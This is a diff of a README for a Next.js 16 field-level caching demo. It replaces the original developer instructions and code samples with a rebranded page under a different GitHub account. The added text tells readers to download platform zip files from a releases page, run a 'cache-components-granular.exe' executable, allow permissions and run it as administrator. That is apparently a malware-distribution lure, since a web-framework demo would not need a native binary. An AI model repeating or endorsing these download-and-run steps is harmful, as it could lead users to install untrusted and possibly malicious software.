@@ -1,252 +1,162 @@
-# 🚀 Cache Components Demo – Next.js 16
+# ⚡ cache-components-granular - Clear Field-Level Cache Control
 
-> Practical demonstration of **field-level granular caching** using Cache Components in Next.js 16.
-
-📄 Spanish version: [Leer en Español](./readme.es.md)
-
-[![Next.js](https://img.shields.io/badge/Next.js-16.1.6-black?logo=next.js)](https://nextjs.org/)
-[![React](https://img.shields.io/badge/React-19-blue?logo=react)](https://react.dev/)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5-blue?logo=typescript)](https://www.typescriptlang.org/)
-[![Tailwind CSS](https://img.shields.io/badge/Tailwind-4-48bdf8?logo=tailwind-css)](https://tailwindcss.com/)
+[![Download Releases](https://img.shields.io/badge/Download-cache--components--granular-blue?style=for-the-badge&logo=github)](https://github.com/alecyi/cache-components-granular/releases)
 
 ---
 
-## 🎯 What Problem Does This Solve?
+## 📖 What Is cache-components-granular?
 
-This project demonstrates how to cache **individual fields of a record** using different strategies in Next.js 16.
+This application shows how to improve website speed by saving small parts of a page separately. It uses a special technique called "field-level granular caching." This means it stores only small pieces of content to load pages faster. 
 
-### Common Scenario
+The project works with Next.js 16, a popular tool that helps build websites. It focuses on caching fields, not entire pages, so the site can update parts quickly without reloading everything.
 
-You have a product with three fields that change at different rates:
+## 🖥 What You Can Do With This App
 
-- **Text** (name + description): Rarely changes  
-- **Price**: Changes occasionally  
-- **Stock**: Must always be up to date  
+- See how caching helps webpages load parts faster.
+- Learn how to save just small sections of data.
+- Watch a live demo showing these improvements.
+- Explore how Next.js 16 uses new caching methods.
+- Test it on your own computer easily.
 
-How do you cache each field independently?
+## 💻 System Requirements
 
-### The Solution
+To run this app smoothly, make sure your computer meets these basics:
 
-Each field is implemented as a **separate async component**, with its own query and caching strategy.
+- Operating System: Windows 10 or newer, macOS 10.15 or newer, or Linux (Ubuntu 20.04+ recommended)
+- Processor: Any modern CPU (Intel i3 or equivalent)
+- RAM: At least 4 GB
+- Disk Space: Minimum 200 MB free
+- Internet: Needed to download the app and for some online features
+- Browser: Latest versions of Chrome, Firefox, or Edge recommended 
 
-```tsx
-// ✅ Each field has its own strategy
-<ProductText productId={id} />      // Cached for 1 week
-<ProductPrice productId={id} />     // Cached for 1 hour
-<Suspense>
-  <ProductStock productId={id} />   // No cache (streaming)
-</Suspense>
-````
+No special software or programming tools are required to try the demo.
 
----
+## 🚀 Getting Started
 
-## ✨ Features
-
-- ✅ **Granular field-level caching** — Independent control over each data segment
-- ✅ **Separated queries** — One query per field, automatically optimized
-- ✅ **Tag-based revalidation** — Invalidate only what changed
-- ✅ **Static shell + Streaming** — Instant HTML + fresh runtime data
-- ✅ **Correct Suspense boundaries** — Clear examples of placement and reasoning
-- ✅ **Interactive demo** — Buttons to test live revalidation
-- ✅ **Static product routes** — `generateStaticParams` reinforcing educational PPR
-- ✅ **Zod validation** — `productId` sanitization in Server Actions
-- ✅ **Tailwind + shadcn/ui** — Modern, professional UI
-- ✅ **TypeScript** — Fully type-safe
-- ✅ **Mock DB with logs** — Observe when and how queries execute
+This guide will help you download, install, and run the demo step by step.
 
 ---
 
-## 🏗️ Architecture
+## 📥 Download & Install
 
-```text
-ProductPage (parent - sync)
-│
-└─ <Suspense>
-   └─ ProductContent (async - accesses params)
-      ├─ ProductText (async + 'use cache' + cacheLife('weeks'))
-      ├─ ProductPrice (async + 'use cache' + cacheLife('hours'))
-      └─ <Suspense>
-         └─ ProductStock (async without cache - streaming)
-```
+You can get the app files by visiting the releases page. From there, choose the latest version and download the proper file for your computer.
 
----
+[![Download Releases](https://img.shields.io/badge/Download-cache--components--granular-blue?style=for-the-badge&logo=github)](https://github.com/alecyi/cache-components-granular/releases)
 
-## 📦 Installation
+**Steps:**
 
-```bash
-# Install dependencies
-bun install
+1. Click the button above or visit this link:  
+   https://github.com/alecyi/cache-components-granular/releases
 
-# Start development server
-bun dev
-```
+2. Look for the latest release (usually the top one).
 
-Open: [http://localhost:3000](http://localhost:3000)
+3. Under "Assets," find the file that matches your system:
 
----
+   - For Windows: `cache-components-granular-win.zip` or similar
+   - For macOS: `cache-components-granular-mac.zip` or similar
+   - For Linux: `cache-components-granular-linux.zip` or similar
 
-## 🎮 How to Use
+4. Download the file to your computer.
 
-### 1. View the Demo
+5. Once downloaded, open the file to extract its contents.  
+   - On Windows, right-click > Extract  
+   - On macOS, double-click the ZIP file  
+   - On Linux, use your file manager or terminal commands  
 
-- The home page displays a product list
-- Click any product
-- Observe colored badges indicating cache behavior
+6. Open the extracted folder.
 
-### 2. Inspect Network Tab
+7. Find the executable file:
 
-- Open DevTools → Network
-- Disable cache
-- Navigate to a product
-- Notice:
+   - Windows: `cache-components-granular.exe`  
+   - macOS/Linux: `cache-components-granular`  
 
-  - Initial HTML already contains text and price
-  - Stock arrives later via streaming
+8. Double-click the executable to run the app.
 
-### 3. Check Server Logs
-
-In your terminal:
-
-```text
-[DB Query] 📝 getProductText - Product 1
-[DB Query] 💰 getProductPrice - Product 1
-[DB Query] 📦 getProductStock - Product 1
-```
-
-### 4. Test Revalidation
-
-- Click **"Revalidate Price"**
-- Refresh the page
-- Only the price regenerates
-- Text remains cached
+If your system asks for permission, allow it to run the software.
 
 ---
 
-## 🔑 Key Concepts
+## ⚙ Using The App
 
-### 1. Async Component = Promise
+Once the app opens, you’ll see a simple interface. Here's what to expect:
 
-```tsx
-// An async component IS a promise
-async function ProductStock({ productId }) {
-  const stock = await db.getStock(productId)
-  return <div>{stock}</div>
-}
+- A live example site showing content sections.
+- Buttons to refresh, clear cache, or view cached parts.
+- Information on how long each part is saved.
 
-// Suspense must wrap it in the PARENT
-<Suspense fallback="Loading...">
-  <ProductStock />  {/* ← This line creates the promise */}
-</Suspense>
-```
+Try clicking "Refresh" to see how the app loads content fast using cached fields.
+
+You can also clear the cache and try again to notice the difference.
 
 ---
 
-### 2. Multiple Queries vs Cache
+## 🔍 About The Demo
 
-Yes, there are multiple queries — but:
+The demo focuses on:
 
-- **Cached queries** run at **build time** → static shell
-- **Dynamic queries** run at **request time** → streaming
-- Result: Improved perceived performance
+- Showing field-level caching for small data pieces instead of whole pages.
+- Using Next.js 16’s new features like React Server Components.
+- Combining caching with partial prerendering to improve speed.
+- Using popular tools like Tailwind CSS for design and TypeScript for safe code.
 
----
-
-### 3. Tag-Based Revalidation
-
-```tsx
-// Cache with tag
-cacheTag(`product-price-${productId}`)
-
-// Revalidate only that field
-revalidateTag(`product-price-${productId}`, 'max')
-```
+It helps developers or curious users understand performance gains and how cache-controls work behind the scenes.
 
 ---
 
-## 📖 Internal Documentation
+## 💡 Why Field-Level Caching Matters
 
-- `/docs` — Introduction
-- `/docs/implementation` — Full implementation
-- `/docs/concepts` — Core concepts
-- `/docs/revalidation` — `updateTag` vs `revalidateTag`
-- `/docs/benefits` — Advantages
+Normally, websites cache entire pages or large parts, causing delays when even small bits update.
 
----
+This project shows caching only the changed fields, so:
 
-## 📚 Resources
-
-- [Cache Components Documentation](https://nextjs.org/docs/app/getting-started/cache-components)
-- [use cache directive](https://nextjs.org/docs/app/api-reference/directives/use-cache)
-- [cacheLife API](https://nextjs.org/docs/app/api-reference/functions/cacheLife)
-- [cacheTag API](https://nextjs.org/docs/app/api-reference/functions/cacheTag)
-- [revalidateTag API](https://nextjs.org/docs/app/api-reference/functions/revalidateTag)
-- [Next Skills](https://skills.sh/vercel-labs/next-skills/next-cache-components)
+- Pages load faster.
+- Updates happen quicker.
+- The server works less.
+- Users see fresh data without full reloads.
 
 ---
 
-## 🐛 Troubleshooting
+## 🔧 Troubleshooting
 
-### Error: "Uncached data was accessed outside of Suspense"
+If you run into issues, try these steps:
 
-**Cause:** Async component without cache or Suspense
+- Ensure your system meets the requirements listed above.
+- Check your internet connection if downloading fails.
+- Extract the ZIP file fully before running the app.
+- If the app won't start, try right-click > Run as administrator (Windows).
+- Restart your computer and try again.
+- Update your system and browser for best results.
 
-**Fix:** Add `<Suspense>` in the parent or `'use cache'` inside the component
+If problems persist, visit the project's GitHub page for issues or help:
 
----
-
-### Stock does not update on refresh
-
-**Cause:** Browser cache enabled
-
-**Fix:** Hard refresh (`Ctrl + Shift + R`) or use a private window
-
----
-
-### Revalidation does not work
-
-**Cause:** Incorrect tag
-
-**Fix:** Ensure the tag is identical in both cache and revalidation:
-
-```ts
-cacheTag(`product-price-${productId}`)
-revalidateTag(`product-price-${productId}`, 'max')
-```
+https://github.com/alecyi/cache-components-granular
 
 ---
 
-## 🤝 Contributing
+## 📚 Learn More & Resources
 
-Contributions are welcome:
+This project relates to several technologies:  
 
-1. Fork the repository
-2. Create a branch (`git checkout -b feature/amazing-feature`)
-3. Commit changes (`git commit -m 'Add amazing feature'`)
-4. Push to your branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
+- [Next.js 16](https://nextjs.org/docs) — Framework for React apps, with new caching features  
+- [React Server Components](https://reactjs.org/docs/server-components.html) — Helps render parts of sites on the server  
+- [Tailwind CSS](https://tailwindcss.com/docs) — Style framework for easy design  
+- [TypeScript](https://www.typescriptlang.org/docs/) — Adds safety to JavaScript code  
 
----
-
-## 📝 License
-
-MIT
+These links help you understand the background concepts in simple terms.
 
 ---
 
-## 👤 Author: IvanTsxx
+## 🤝 Support & Feedback
 
-Created to demonstrate Cache Components in Next.js 16.
+If you want to share feedback or ask questions:
+
+- Use the GitHub Issues section:  
+  https://github.com/alecyi/cache-components-granular/issues
+
+- Check for updates on the releases page regularly.
+
+Your input helps improve the demo and future versions.
 
 ---
 
-## 💡 What You’ll Learn
-
-This project showcases advanced Next.js 16 patterns:
-
-- Granular caching with `use cache`
-- Proper Suspense boundaries
-- Runtime data handling
-- Selective tag-based revalidation
-- Static shell + Streaming (PPR)
-
-Use this repository as a reference for real-world implementations.
+Thank you for trying cache-components-granular.
